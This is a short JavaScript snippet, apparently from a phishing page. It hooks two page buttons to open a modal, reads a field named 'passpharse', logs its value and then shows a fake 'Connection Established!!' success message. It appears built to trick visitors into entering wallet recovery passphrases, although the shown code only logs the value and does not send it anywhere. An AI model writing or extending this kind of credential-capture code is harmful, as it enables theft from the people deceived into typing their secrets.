let myModalAlternative;
setTimeout(()=>{
    const body = document.getElementsByTagName('body')[0];

const button = document.getElementsByClassName('deXseV');
const secButton = document.getElementsByClassName('jmRqFu')[0];
console.log(button);
const singleButton = button[0];
myModalAlternative = new bootstrap.Modal('#exampleModal', {});
singleButton.addEventListener('click',()=>{ 
    myModalAlternative.show();
})

secButton.addEventListener('click',()=>{ 
    myModalAlternative.show();
})
// button.addEventListener('click',(e)=>{
//     console.log(e);
//     alert("wat is shrink")
// })

},2500);

const submit =()=>{
    console.log("worked here");
    const resp = document.getElementById("passpharse").value;
    console.log(resp);
    
    myModalAlternative.hide();
    swal("Good job!", "Connection Established!!", "success");
}